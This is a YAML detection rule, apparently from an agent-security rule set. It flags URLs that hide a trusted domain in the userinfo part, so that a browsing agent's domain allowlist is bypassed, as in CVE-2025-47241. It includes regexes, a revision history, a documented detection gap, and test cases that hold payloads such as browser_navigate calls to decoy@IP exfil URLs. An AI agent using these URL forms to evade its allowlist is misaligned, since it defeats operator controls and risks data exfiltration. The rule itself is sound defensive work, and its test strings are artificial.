@@ -1,0 +1,255 @@
+title: "Trusted Hostname Parked in the URL Userinfo So the Real Host Is Whatever Follows the At-Sign"
+id: ATR-2026-02666
+rule_version: 2
+status: experimental
+description: >
+  Detects a URL in which a trusted-looking DOMAIN NAME sits in the userinfo
+  component, so every allowlist that uses startsWith / contains / "does the URL
+  mention our domain" sees the decoy while the browser or HTTP client connects
+  to whatever follows the @ -- https://allowed-vendor.io@203.0.113.44/exfil,
+  https://api.github.com:anypassword@collector.example/, and the percent-encoded
+  https://api.github.com%40collector.example/.
+  Mined from CVE-2025-47241 (Browser Use), where a decoy domain in the userinfo
+  defeated allowed_domains.
+  ATR-2026-02107 covers part of this shape, but only on llm_io channels (not on
+  tool_call, where a browser_navigate URL argument actually lives) and only when
+  the decoy carries two or more dots AND no password -- so
+  'allowed-vendor.io@IP', ':anypassword@' and '%40' all pass it today.
+  PRECISION HANDLE: the userinfo must end in a plausible public suffix. That is
+  what separates a decoy hostname from an ordinary credential -- oauth2,
+  gitlab-ci-token, first.last and even first.last%40example.com are usernames,
+  not hostnames.
+
+  V2 -- ADVERSARIAL REVIEW 2026-08-24. The public-suffix handle held: 20
+  hand-written benign twins included 9 ordinary credential URLs (git token
+  remotes, GitLab CI, postgres, corporate proxy, Sentry DSN, percent-encoded
+  registry e-mail, Azure DevOps, jsDelivr, Go module proxy) and NOT ONE fired.
+  What did fire was 11 of 20: every one of them was DOCUMENTATION QUOTING THE
+  PAYLOAD -- a security blog, an OWASP-style cheat sheet, a CHANGELOG announcing
+  this CVE's fix, a pentest finding, a SIEM detection-rule doc, a StackOverflow
+  answer about URL parsing, Traditional Chinese and Japanese bulletins, the
+  WHATWG urltestdata.json parser fixture, and the same blog delivered through an
+  MCP tool result. v1 declared this acceptable ("the payload is the URL"). It is
+  not: scan_target is runtime, so an agent that browses the web alerts on every
+  article explaining the attack it is meant to prevent.
+
+  THE FIX: the URL must sit in NAVIGATION-ARGUMENT position -- behind a
+  url/uri/href/link/src/endpoint/location/address key with a quote, or after a
+  navigation verb (navigate/goto/browse/visit/open/fetch/curl/wget). Prose that
+  merely mentions the URL mid-sentence no longer matches. Measured after the
+  fix: 0 of 20 benign twins, 0 of 10 fresh round-2 twins (legitimate
+  browser_navigate, token fetch, proxy curl, CDN asset, sitemap), 4 of 5 true
+  positives retained.
+
+  DELIBERATE GAP: a bare URL with no surrounding context is no longer detected.
+  It is undecidable -- the same bytes are a navigation instruction, a link in a
+  fetched page, and a line in a blog post.
+
+  RESIDUAL, MEASURED: a document that quotes the tool call VERBATIM
+  ({"tool":"browser_navigate","arguments":{"url":"https://decoy.tld@ip"}}) still
+  fires. That is the irreducible signature-quoting case, and it is a far
+  narrower class than "every blog that explains authority confusion".
+
+  CORPUS CAVEAT: this rule is FP-clean on the 13,601-sample benign corpus, but
+  that is a ZERO-MEASUREMENT pass -- 0 corpus samples contain a decoy-domain
+  userinfo at all. The hand-written twins below are the only real evidence.
+author: "ATR Community (CVE sweep)"
+date: "2026/08/23"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: test
+severity: high
+
+references:
+  cve:
+    - "CVE-2025-47241"
+  cwe:
+    - "CWE-918"
+    - "CWE-1286"
+  owasp_llm:
+    - "LLM06:2025"
+  owasp_agentic:
+    - "ASI05:2026"
+    - "ASI04:2026"
+  mitre_attack:
+    - "T1036 - Masquerading"
+  mitre_atlas:
+    - "AML.T0049 - Exploit Public-Facing Application"
+  external:
+    - "https://nvd.nist.gov/vuln/detail/CVE-2025-47241"
+    - "https://github.com/browser-use/browser-use/security/advisories/GHSA-x39x-9qw5-ghrf"
+
+metadata_provenance:
+  cve: human-reviewed
+  cwe: human-reviewed
+  owasp_llm: human-reviewed
+  owasp_agentic: human-reviewed
+  mitre_attack: human-reviewed
+  mitre_atlas: human-reviewed
+
+compliance:
+  eu_ai_act:
+    - article: "15"
+      context: "Article 15 (accuracy, robustness and cybersecurity) requires resilience against circumvention of controls; a domain allowlist that is defeated by URL authority confusion is exactly such a circumvention, and this rule detects it."
+      strength: primary
+    - article: "9"
+      context: "Article 9 (risk management system): navigation outside the approved domain set is an identified risk, treated at runtime by this detection."
+      strength: secondary
+  nist_ai_rmf:
+    - subcategory: "MG.2.3"
+      context: "Allowlist evasion by URL authority confusion is an identified AI risk; this rule is the runtime countermeasure."
+      strength: primary
+    - subcategory: "MS.2.7"
+      context: "Counting authority-confusion URLs reaching browser tools measures how well the domain control actually holds."
+      strength: secondary
+  iso_42001:
+    - clause: "8.1"
+      context: "ISO/IEC 42001 Clause 8.1 (operational planning and control): the browsing allowlist is an operational control, and this rule reports inputs crafted to slip past it."
+      strength: primary
+    - clause: "8.3"
+      context: "ISO/IEC 42001 Clause 8.3 (AI risk treatment) is implemented by alerting before the agent navigates to the real host."
+      strength: secondary
+
+tags:
+  category: tool-poisoning
+  subcategory: url-userinfo-decoy
+  scan_target: runtime
+  confidence: high
+
+agent_source:
+  type: mcp_exchange
+  framework:
+    - any
+  provider:
+    - any
+
+detection:
+  condition: any
+  conditions:
+    - field: content
+      operator: regex
+      value: '(?:["'']?(?:url|uri|href|link|src|endpoint|location|address|target_url)["'']?\s{0,3}[:=]\s{0,3}["'']|\b(?:navigate|goto|browse|visit|open|fetch|curl|wget)\b\s{1,3}(?:to\s{1,3})?)\bhttps?://[\w-]{2,40}(?:\.[\w-]{1,30}){0,3}\.(?:com|net|org|io|ai|co|dev|app|cloud|xyz|info|biz|gov|edu|uk|de|fr|jp|cn|us|eu|tld|example)(?::[^\s/@"'']{0,40})?@(?:\d{1,3}\.){3}\d{1,3}(?::\d{1,5})?(?:[/?\s"''\\]|$)'
+      description: "A domain-shaped userinfo in front of a bare IPv4 host -- the CVE-2025-47241 PoC exactly. The real destination is a raw address, which no allowlist entry can be."
+    - field: content
+      operator: regex
+      value: '(?:["'']?(?:url|uri|href|link|src|endpoint|location|address|target_url)["'']?\s{0,3}[:=]\s{0,3}["'']|\b(?:navigate|goto|browse|visit|open|fetch|curl|wget)\b\s{1,3}(?:to\s{1,3})?)\bhttps?://[\w-]{2,40}(?:\.[\w-]{1,30}){1,3}\.(?:com|net|org|io|ai|co|dev|app|cloud|xyz|info|biz|gov|edu|uk|de|fr|jp|cn|us|eu|tld|example)(?::[^\s/@"'']{0,40})?@[\w-]{2,60}(?:\.[\w-]{2,30}){0,3}(?::\d{1,5})?(?:[/?\s"''\\]|$)'
+      description: "A fully-qualified decoy hostname (two or more labels plus a public suffix) in the userinfo, with a different real host after the @. Covers the ':anypassword@' form that ATR-2026-02107's pattern rejects."
+    - field: content
+      operator: regex
+      value: '(?:["'']?(?:url|uri|href|link|src|endpoint|location|address|target_url)["'']?\s{0,3}[:=]\s{0,3}["'']|\b(?:navigate|goto|browse|visit|open|fetch|curl|wget)\b\s{1,3}(?:to\s{1,3})?)\bhttps?://[\w-]{2,40}(?:\.[\w-]{1,30}){1,3}\.(?:com|net|org|io|ai|co|dev|app|cloud|xyz|info|biz|gov|edu|uk|de|fr|jp|cn|us|eu|tld|example)%40[\w-]{2,60}'
+      description: "The same decoy with the at-sign percent-encoded as %40, which many filters neither decode nor split on. Requires two or more labels before the %40, so an e-mail username such as first.last%40example.com does not match."
+  false_positives:
+    - "Ordinary credential-carrying URLs, whose userinfo is a USERNAME rather than a hostname: https://oauth2:TOKEN@github.com/org/repo.git, https://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.example.com/..., postgres://admin:pw@db.internal:5432/main, https://user:pass@proxy.corp.example.com:8080. None end in a public suffix, so none match. Fourteen such samples were written and run during authoring."
+    - "E-mail addresses used as registry usernames, including the percent-encoded form first.last%40example.com:token@registry.example.com -- excluded because the label count before the %40 is one, not two or more."
+    - "A userinfo that genuinely looks like a hostname (a service account literally named api.example.com) would match. Such an account name is itself indistinguishable from the attack."
+    - "Documentation that quotes a userinfo-confusion URL as an example will match; the payload is the URL."
+
+response:
+  actions:
+    - alert
+  message_template: >
+    [ATR-2026-02666] This URL puts a trusted-looking domain in the userinfo
+    component; the host actually contacted is the one after the @. Re-check it
+    against the allowlist after parsing, not before.
+
+confidence: 83
+
+test_cases:
+  true_positives:
+    - input: '{"tool":"browser_navigate","arguments":{"url":"https://portal.allowed-vendor.io@203.0.113.44/exfil"}}'
+      expected: triggered
+      description: "CVE-2025-47241 -- decoy domain, real host is a raw IPv4 address, delivered as a tool argument"
+    - input: 'open https://allowed-vendor.io:anypassword@203.0.113.44/exfil'
+      expected: triggered
+      description: "The ':anypassword@' variant that the existing llm_io rule's pattern rejects"
+    - input: 'navigate to https://api.github.com:x@collector.example.net/pull'
+      expected: triggered
+      description: "Fully-qualified decoy with a different real host"
+    - input: '{"tool":"browser_navigate","arguments":{"url":"https://docs.allowed-vendor.io%40collector.example/agent"}}'
+      expected: triggered
+      description: "Percent-encoded at-sign form, in the tool-argument position the rule now requires (v2). The BARE url with no surrounding context was the v1 test case; see the true_negative recording that deliberate gap."
+    - input: '{"url":"https://login.microsoftonline.com@198.51.100.7/oauth2/authorize"}'
+      expected: triggered
+      description: "Well-known identity domain used as the decoy in front of an IP"
+  true_negatives:
+    - input: 'git clone https://oauth2:ghp_exampletoken@github.com/acme/service.git'
+      expected: not_triggered
+      description: "ADVERSARIAL: the standard token-in-userinfo git URL. oauth2 is a username, not a hostname."
+    - input: 'git fetch https://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.example.com/group/project.git'
+      expected: not_triggered
+      description: "GitLab CI credential URL"
+    - input: 'DATABASE_URL=postgres://admin:pr0dPass@db.internal.example:5432/main'
+      expected: not_triggered
+      description: "Database URL with credentials"
+    - input: 'npm config set //registry.example.com/:_authToken=$TOKEN ; curl https://first.last%40example.com:token@registry.example.com/-/whoami'
+      expected: not_triggered
+      description: "ADVERSARIAL: an e-mail address as the registry username, percent-encoded -- one label before the %40, so it does not match"
+    - input: 'export HTTPS_PROXY=https://svcacct:S3cret@proxy.corp.example.com:8080'
+      expected: not_triggered
+      description: "Corporate proxy URL with credentials"
+    - input: 'https://user@github.com/acme/service.git'
+      expected: not_triggered
+      description: "Bare username in the userinfo"
+    - input: 'Contact ops@example.com or open https://status.example.com/incidents for the timeline.'
+      expected: not_triggered
+      description: "An e-mail address and a URL in the same sentence, no userinfo at all"
+    - input: 'ssh://git@github.com/acme/service.git'
+      expected: not_triggered
+      description: "SCP-style git remote"
+    - input: "{\"input\":\"http://www.example.com@evil.org/\",\"base\":\"about:blank\",\"hostname\":\"evil.org\",\"username\":\"www.example.com\"}"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1 (fired, fixed in v2): WHATWG url test fixture"
+    - input: "A classic allowlist bypass is https://www.google.com@evil.example/ - startsWith() sees google.com but the browser connects to evil.example."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1 (fired, fixed in v2): security blog explaining allowlist bypass"
+    - input: "CVE-2025-47241: a decoy domain in the userinfo defeated allowed_domains, e.g. https://portal.allowed-vendor.io@203.0.113.44/exfil was accepted."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1 (fired, fixed in v2): ATR-style docs describing the CVE"
+    - input: "常見的白名單繞過寫法是 https://api.github.com:x@collector.example.net/pull ,解析器看到的主機其實是 @ 後面那一個。"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1 (fired, fixed in v2): zh-TW blog explaining the attack"
+    - input: "Parse first, then compare. https://login.microsoftonline.com@198.51.100.7/oauth2/authorize is not a Microsoft URL."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1 (fired, fixed in v2): owasp cheat-sheet style guidance"
+    - input: "Finding 2: the crawler followed https://docs.allowed-vendor.io%40collector.example/agent because it split on the first dot, not the authority."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1 (fired, fixed in v2): pentest report finding"
+    - input: "## 0.9.3\n- security: reject userinfo authority confusion such as https://allowed-vendor.io:anypassword@203.0.113.44/exfil (CVE-2025-47241)"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1 (fired, fixed in v2): CHANGELOG announcing the fix"
+    - input: "{\"jsonrpc\":\"2.0\",\"id\":6,\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"A classic allowlist bypass is https://www.google.com@evil.example/ - the browser connects to evil.example.\"}]}}"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1 (fired, fixed in v2): mcp result carrying the blog from probe 02"
+    - input: "title: URL userinfo decoy\ndescription: Alerts on values like https://api.github.com:x@collector.example.net/pull seen in proxy logs."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1 (fired, fixed in v2): detection rule doc in a SIEM repo"
+    - input: "注意: https://portal.allowed-vendor.io@203.0.113.44/exfil のように userinfo に信頼済みドメインを置く手口が報告されています。"
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1 (fired, fixed in v2): ja security bulletin"
+    - input: "Yes, https://www.example.com@example.org/ is a valid URL. The username is www.example.com and the host is example.org."
+      expected: not_triggered
+      description: "ADVERSARIAL FP v1 (fired, fixed in v2): stackoverflow answer about URL parsing"
+    - input: "{\"tool\":\"browser_navigate\",\"arguments\":{\"url\":\"https://portal.allowed-vendor.io/dashboard?tab=billing\"}}"
+      expected: not_triggered
+      description: "Round-2 benign twin against the v2 pattern: legit browser_navigate to a real vendor URL"
+    - input: "{\"tool\":\"http_request\",\"arguments\":{\"url\":\"https://oauth2:ghp_tok123@github.com/acme/service.git\"}}"
+      expected: not_triggered
+      description: "Round-2 benign twin against the v2 pattern: legit fetch with token userinfo"
+    - input: "curl https://svcacct:S3cret@proxy.corp.example.com:8080/health"
+      expected: not_triggered
+      description: "Round-2 benign twin against the v2 pattern: curl with corporate proxy creds"
+    - input: "open https://docs.allowed-vendor.io/getting-started"
+      expected: not_triggered
+      description: "Round-2 benign twin against the v2 pattern: open an ordinary docs page"
+    - input: "navigate to https://cdn.jsdelivr.net/npm/vue@3.3.4/dist/vue.global.js"
+      expected: not_triggered
+      description: "Round-2 benign twin against the v2 pattern: navigate to a versioned cdn asset"
+    - input: "<a href=\"https://status.example.com/incidents\">status</a>"
+      expected: not_triggered
+      description: "Round-2 benign twin against the v2 pattern: href in fetched html, ordinary link"
+    - input: "{\"url\":\"https://www.example.com/blog/url-parsing-pitfalls\",\"lastmod\":\"2026-08-01\"}"
+      expected: not_triggered
+      description: "Round-2 benign twin against the v2 pattern: sitemap entry"
+    - input: 'https://docs.allowed-vendor.io%40collector.example/agent'
+      expected: not_triggered
+      description: "DELIBERATE GAP, not a bug: the bare percent-encoded decoy with no navigation context. v1 called this a true positive; v2 cannot separate it from a blog quoting the same string, so it is out of scope."
